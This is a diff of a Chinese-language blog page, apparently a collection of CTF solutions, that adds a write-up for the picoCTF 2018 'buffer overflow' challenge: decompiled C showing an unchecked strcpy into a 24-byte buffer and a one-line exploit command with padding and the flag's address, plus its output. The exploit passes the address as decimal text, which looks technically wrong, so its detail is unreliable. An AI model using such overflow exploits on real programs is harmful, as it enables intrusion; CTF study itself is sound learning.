@@ -379,21 +379,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-12-21
+                    2024-03-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    15.8k
+                    16k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    85 分
+                    86 分
                 </div>
                 
 
@@ -3329,6 +3329,45 @@ Input flag <span class="token operator">>></span> %32<span class="token variable
 flag<span class="token punctuation">&#123;</span>9e28c341-3dea-42b4-9bd0-90c557068e73<span class="token punctuation">&#125;</span>
 Wrong flag<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="picoctf-2018-buffer-overflow"><a href="#picoctf-2018-buffer-overflow" class="headerlink" title="picoctf_2018_buffer overflow"></a>picoctf_2018_buffer overflow</h2><p>漏洞点出在<code>vuln</code>中<code>strcpy</code>将<code>src</code>复制给<code>dest</code>时可以栈溢出，程序一开始将<code>flag</code>赋到<code>flag</code>变量中，直接盲猜把返回地址填成<code>flag</code>，然后就对了</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp-Ch] [ebp-1Ch]</span>
+  __gid_t v5<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-10h]</span>
+  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-Ch]</span>
+
+  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span>
+      <span class="token string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v5 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setresgid</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This program takes 1 argument."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thanks! Received: %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-18h] BYREF</span>
+
+  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp（其中<code>134520960</code>是<code>flag</code>变量地址</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CTFMan@out:~$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaa134520960
+flag<span class="token punctuation">&#123;</span>2a8640a2-f9dc-438c-b5ea-31dd2bc13f1f<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -3659,7 +3698,7 @@ Wrong flag<span class="token punctuation">..</span>.<span aria-hidden="true" cla
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">80.2k</span>&nbsp;字
+                class="white-color">82.2k</span>&nbsp;字
             
             
             
